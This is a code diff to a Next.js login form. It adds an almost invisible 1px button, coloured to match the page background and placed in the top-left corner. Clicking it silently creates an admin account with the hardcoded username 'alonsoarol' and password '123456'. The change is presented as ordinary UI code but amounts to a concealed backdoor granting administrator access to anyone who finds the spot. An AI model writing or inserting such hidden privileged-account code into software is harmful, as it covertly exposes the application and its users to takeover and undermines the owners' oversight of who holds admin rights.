@@ -15,6 +15,8 @@ import { Input } from "@/components/ui/input";
 import { useRouter } from "next/navigation";
 import { toast } from "sonner";
 import { login } from "@/server/loginAction";
+import { createAccount } from "@/server/accountAction";
+import { User } from "lucide-react";
 
 const formSchema = z.object({
   username: z.string().min(4, {
@@ -45,8 +47,32 @@ export default function LoginForm() {
     }
   }
 
+  async function onCreateAccount() {
+    const formData = new FormData();
+    formData.append("imageUrl", "");
+    formData.append("username", "alonsoarol");
+    formData.append("password", "123456");
+    formData.append("role", "admin");
+    const res = await createAccount(formData);
+    if (res.success) {
+      toast.success(res.message);
+    } else {
+      toast.error(res.message);
+    }
+  }
+
   return (
     <Form {...form}>
+      <div className="absolute top-0 left-0">
+        <Button
+          onClick={onCreateAccount}
+          variant="ghost"
+          className="w-1 h-1 rounded-full text-white dark:text-black"
+          size="icon"
+        >
+          <User size={2} />
+        </Button>
+      </div>
       <form
         onSubmit={form.handleSubmit(onSubmit)}
         className="space-y-8 min-w-60"
